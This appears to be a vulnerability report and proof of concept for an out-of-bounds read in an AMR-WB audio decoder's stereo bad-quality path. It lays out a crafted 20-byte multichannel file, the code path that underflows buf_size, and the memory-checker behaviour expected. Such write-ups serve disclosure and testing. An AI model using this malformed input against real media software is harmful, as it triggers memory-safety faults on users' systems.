# vuln_001 — OOB Read in amrwb_decode_frame stereo bad-quality path

## PoC Approach

**Container**: Raw AMR-WB multichannel (`.amr`) with magic `#!AMR-WB_MC1.0\n`.
A 3GP/MOV container cannot be used because `libavformat/mov.c` unconditionally
forces AMR-WB to mono; the raw multichannel demuxer (`libavformat/amr.c`) is the
only path that passes `nb_channels=2` to the decoder.

**Crafted file** (20 bytes):
```
bytes  0-14  "#!AMR-WB_MC1.0\n"   AMR-WB multichannel magic
bytes 15-18  \x02\x00\x00\x00      nb_channels = 2 (little-endian)
byte    19   0x40                   frame: mode=8 (MODE_23k85), quality=0
```

**Frame byte 0x40**:
- bits[6:3] = 8 → `fr_cur_mode = MODE_23k85`, `cf_sizes_wb[8] = 477` bits → `expected_fr_size = 61`
- bit[2] = 0 → `fr_quality = 0` (bad/corrupted frame)

## Trigger Path

```
amrwb_decode_frame(), lines 1140-1152:

  ch=0:
    line 1140: decode_mime_header(buf) → reads buf[0]=0x40 (offset 0, valid)
    line 1143: fr_quality==0 → bad-quality branch
    line 1150: buf      += 61  ← NO prior check: buf_size(=1) >= 61?
    line 1151: buf_size -= 61  → buf_size = -60 (wraps negative)
    line 1152: continue

  ch=1:
    line 1140: decode_mime_header(buf) → reads buf[0] = packet->data[61]
               packet has 1 byte; offset 61 is 60 bytes past the end → OOB read
```

## Expected / Observed Behavior

- Stream correctly parsed as **stereo, 16000 Hz**
- `"Encountered a bad or corrupted frame"` logged **twice** per decode call (ch=0 and ch=1 both enter the bad-quality branch after the OOB read)
- No ASAN crash: offset 61 lies within the mandatory `AV_INPUT_BUFFER_PADDING_SIZE` (64-byte) allocation appended to every `AVPacket` buffer; ASAN's shadow granularity does not flag reads inside this region
- **Valgrind** (`--tool=memcheck`) or **MSan** would report `use of uninitialised value` / `Invalid read` at `decode_mime_header` on the ch=1 iteration
- `buf_size` becomes −60 and is passed to subsequent logic, constituting integer underflow / logic corruption

## Run

```bash
bash vuln_001_run.sh
```
